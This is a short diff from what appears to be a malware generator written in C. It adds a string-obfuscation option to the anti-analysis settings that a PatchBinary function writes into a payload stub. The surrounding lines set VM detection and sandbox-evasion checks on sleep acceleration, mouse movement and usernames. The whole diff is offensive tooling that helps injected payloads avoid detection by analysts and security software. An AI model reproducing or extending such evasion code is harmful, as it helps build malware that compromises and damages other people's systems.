@@ -26,6 +26,7 @@
 #define OFF_CHECK_SLEEP     (OFF_CHECK_VM_CPUID + 1)
 #define OFF_CHECK_MOUSE     (OFF_CHECK_SLEEP + 1)
 #define OFF_CHECK_USERNAME  (OFF_CHECK_MOUSE + 1)
+#define OFF_OBFUSCATE_STR   (OFF_CHECK_USERNAME + 1)
 
 BYTE GetTechniqueIndex(InjectionTechnique technique) {
 	switch (technique) {
@@ -187,6 +188,7 @@ BOOL PatchBinary(MalgenConfig* config, LPVOID payload, SIZE_T payload_size) {
 	*(stub_data + marker_offset + OFF_CHECK_SLEEP) = (BYTE)config->anti_analysis.anti_sandbox.check_sleep_acceleration;
 	*(stub_data + marker_offset + OFF_CHECK_MOUSE) = (BYTE)config->anti_analysis.anti_sandbox.check_mouse_movement;
 	*(stub_data + marker_offset + OFF_CHECK_USERNAME) = (BYTE)config->anti_analysis.anti_sandbox.check_username;
+	*(stub_data + marker_offset + OFF_OBFUSCATE_STR) = (BYTE)config->anti_analysis.obfuscate_strings;
 
 	hOutput = CreateFileA(config->output_path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
 	if (hOutput == INVALID_HANDLE_VALUE) {
